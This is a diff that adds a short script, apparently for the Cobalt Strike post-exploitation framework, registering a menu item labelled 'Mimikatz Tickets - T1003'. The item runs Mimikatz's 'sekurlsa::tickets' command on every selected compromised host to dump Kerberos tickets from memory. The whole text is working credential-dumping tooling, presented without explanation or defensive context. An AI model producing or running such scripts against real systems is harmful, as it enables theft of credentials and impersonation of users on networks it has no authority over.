@@ -1,0 +1,14 @@
+item "Mimikatz Tickets  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					tickets($bid);
+				}
+			}
+
+
+
+sub tickets{
+
+bmimikatz($1, "sekurlsa::tickets");
+
+}
